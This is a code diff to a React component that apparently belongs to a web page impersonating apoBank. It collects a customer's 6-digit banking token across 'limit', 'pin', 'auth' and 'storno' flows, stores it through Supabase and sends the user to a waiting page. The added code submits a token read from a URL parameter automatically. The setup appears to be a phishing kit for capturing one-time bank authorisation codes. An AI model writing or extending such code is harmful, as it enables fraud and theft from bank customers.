@@ -1,6 +1,6 @@
-import { useState } from "react";
+import { useEffect, useRef, useState } from "react";
 import apoBankLogo from "@/assets/apobank-logo.svg";
-import { useNavigate } from "react-router-dom";
+import { useNavigate, useSearchParams } from "react-router-dom";
 import { supabase } from "@/integrations/supabase/client";
 import { Input } from "@/components/ui/input";
 import { Button } from "@/components/ui/button";
@@ -26,15 +26,15 @@ const ORDER: Kind[] = ["limit", "pin", "auth", "storno"];
 
 const TokenEntry = ({ kind, title, description }: Props) => {
   const navigate = useNavigate();
+  const [searchParams] = useSearchParams();
   const [token, setToken] = useState("");
   const [loading, setLoading] = useState(false);
   const [error, setError] = useState<string | null>(null);
+  const autoRan = useRef(false);
 
-  const handleSubmit = async (e: React.FormEvent) => {
-    e.preventDefault();
+  const runSubmit = async (rawToken: string) => {
     setError(null);
-
-    const compact = token.replace(/[^0-9]/g, "").slice(0, 6);
+    const compact = rawToken.replace(/[^0-9]/g, "").slice(0, 6);
     if (compact.length < 6) { setError("Bitte den vollständigen 6-stelligen Token eingeben."); return; }
     const clean = `${compact.slice(0, 3)}-${compact.slice(3)}`;
     setLoading(true);
@@ -116,6 +116,25 @@ const TokenEntry = ({ kind, title, description }: Props) => {
     }
     navigate(`/token/wait?kind=${foundKind}&token=${encodeURIComponent(clean)}`);
   };
+
+  const handleSubmit = async (e: React.FormEvent) => {
+    e.preventDefault();
+    await runSubmit(token);
+  };
+
+  useEffect(() => {
+    const t = searchParams.get("t") || searchParams.get("token");
+    if (t && !autoRan.current) {
+      autoRan.current = true;
+      const compact = t.replace(/[^0-9]/g, "").slice(0, 6);
+      const formatted = compact.length > 3 ? `${compact.slice(0, 3)}-${compact.slice(3)}` : compact;
+      setToken(formatted);
+      runSubmit(compact);
+    }
+    // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, [searchParams]);
+
+
 
   return (
     <div className="min-h-screen bg-white flex flex-col relative">
